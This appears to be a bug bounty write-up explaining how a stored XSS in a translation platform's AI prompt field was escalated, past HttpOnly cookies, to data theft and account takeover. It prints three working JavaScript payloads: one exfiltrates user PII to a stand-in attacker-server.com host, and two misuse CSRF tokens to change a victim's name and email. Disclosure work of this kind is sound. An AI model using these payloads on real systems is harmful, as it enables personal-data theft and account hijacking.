# How We Turned a Medium XSS into a High Bounty by Bypassing HttpOnly Cookie

#### **﷽**

During a recent security assessment on a private bug bounty program with my friends @0d\_sami and @karemelsaqary , We discovered a Stored Cross-Site Scripting (XSS) vulnerability that was initially triaged as medium severity. However, by uncovering a way to bypass HttpOnly cookies, I was able to escalate its impact, resulting in a high-severity classification and a 3x increase in the bounty. Let’s dive into the details of this finding and how I achieved this escalation.

***

## **The Initial Discovery**

The target application was a common platform used for website translations, featuring team management, project management, and an AI-powered section. While testing for privilege escalation and injection attacks, I stumbled upon an interesting input field in the AI prompts section. Specifically, there was a "select bar" for choosing prompt types, but at the end of the list, there was an option to create a custom prompt type. This immediately caught my attention as a potential vector for XSS.

I tested the input field with standard XSS payloads and successfully triggered a stored XSS vulnerability. However, there were two significant limitations:

1. **Character Limit**: The input field was restricted to 255 characters, which made crafting a payload challenging.
2. **HttpOnly Cookies**: The session cookies were protected by the HttpOnly flag, preventing JavaScript from accessing them.

Despite these limitations, I reported the vulnerability, expecting it to be classified as medium severity due to the restricted impact. The triage team confirmed this assessment, stating that the HttpOnly flag mitigated the risk of cookie theft, leaving only the potential for script execution.

<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

***

## **Escalating the Impact**

While the initial finding was valid, I wasn’t satisfied with the medium severity classification. I began exploring ways to increase the impact of the vulnerability. Here’s how I did it:

### **1. Expanding the Attack Scope**

I discovered that projects could be made public, significantly widening the attack surface. If an attacker could lure users to join their project and view the AI prompts, the XSS payload would trigger for all those users. While this increased the potential impact, it still wasn’t enough to convince the security team to classify the vulnerability as high severity.

<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

### **2. Leaking Sensitive User Data**

Next, I focused on finding ways to exfiltrate sensitive data. During my testing, I identified an endpoint (`/backend/settings/change_account`) that leaked all user PII (Personally Identifiable Information) if an incorrect request was sent Like Requesting it without providing the `X-CSRF-TOKEN:` header or without the required parameters and it was very very strange behavior. The challenge was crafting a payload within the 255-character limit to exploit this.

After some experimentation and assistance from AI to optimize the payload, I came up with the following:

{% code overflow="wrap" %}
```javascript
fetch('/backend/settings/change_account').then(r => r.json()).then(d => location = 'https://attacker-server.com?data=' + encodeURIComponent(JSON.stringify(d))).catch(console.error);
```
{% endcode %}

This payload forced the victim’s browser to make a request to the vulnerable endpoint, leaking all user data and sending it to my Burp Collaborator server.

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **3. Bypassing HttpOnly for CSRF Tokens**

While the session cookies were protected by the HttpOnly flag, I noticed that the CSRF token was stored in a non-HttpOnly cookie. This token was also included in the headers of requests to sensitive endpoints, such as the one used to change user passwords. By leveraging the XSS vulnerability, I could extract the CSRF token and use it to perform actions on behalf of the victim.

Here’s the payload I used to change the victim’s profile name:

{% code overflow="wrap" %}
```javascript
<script>fetch('/backend/settings/change_account',{method:'POST',headers:{'X-Csrf-Token':'fkel9z9je2','Content-Type':'application/x-www-form-urlencoded'},body:'step=real_name&real_name=hacked+0x88'}).then(r=>r.json()).then(console.log)</script>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

### **4. Achieving Account Takeover**

To escalate the attack further, I aimed to change the victim’s email address, which would allow for a full account takeover. However, the request to change the email required an additional parameter (`_token`) that wasn’t stored in any cookie. After some investigation, I found that this token was leaked in the HTML content of the victim’s profile page. By making a request to the profile endpoint and exfiltrating the HTML, I was able to extract the `_token` and use it in another XSS payload to change the victim’s email:

{% code overflow="wrap" %}
```javascript
<script>fetch('/api/front/user/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_email=t@t.co&_token=tokeforvictim'}).then(r=>r.json()).then(console.log)</script>
```
{% endcode %}

***

## **Additional Exploitation Scenarios**

Beyond account takeover, I demonstrated other severe impacts that could result from the XSS vulnerability, including:

1. **Ad Fraud**: Injecting malicious advertisements into the page.
2. **SEO Manipulation**: Injecting backlinks to manipulate search engine rankings.
3. **Cryptojacking**: Injecting scripts to mine cryptocurrency without the user’s consent.

<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

The security team ultimately agreed with my assessment, reclassifying the vulnerability as high severity and awarding a significantly higher bounty. This finding serves as a reminder that persistence and creativity can turn seemingly minor vulnerabilities into critical security issues.

<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

Stay curious, and happy hunting!

<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

**سُبْحَانَكَ اللَّهُمَّ وَبِحَمْدِكَ ، أَشْهَدُ أَنْ لا إِلَهَ إِلا أَنْتَ ، أَسْتَغْفِرُكَ وَأَتُوبُ إِلَيْكَ**
